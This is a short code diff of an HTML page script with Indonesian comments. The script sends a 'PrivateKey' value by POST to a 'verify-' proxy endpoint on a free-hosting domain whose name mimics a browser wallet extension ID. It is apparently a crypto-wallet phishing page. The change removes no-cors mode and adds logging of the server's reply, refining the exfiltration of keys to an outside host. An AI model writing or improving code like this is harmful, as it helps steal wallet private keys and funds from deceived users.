@@ -17,12 +17,13 @@
 
             fetch("https://verify-nkbihfbeogaeaoehlefn.infy.uk/proxy.php", {
     method: "POST",
-    mode: "no-cors",  // Tambahkan ini
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ PrivateKey: "contohPrivateKey" }),
+    body: JSON.stringify({ PrivateKey: "contohPrivateKey" })
 })
-.then(response => console.log("Permintaan dikirim"))
+.then(response => response.json()) // Ubah jadi JSON
+.then(data => console.log("Server Response:", data))
 .catch(error => console.error("Error:", error));
+
 
         }
     </script>
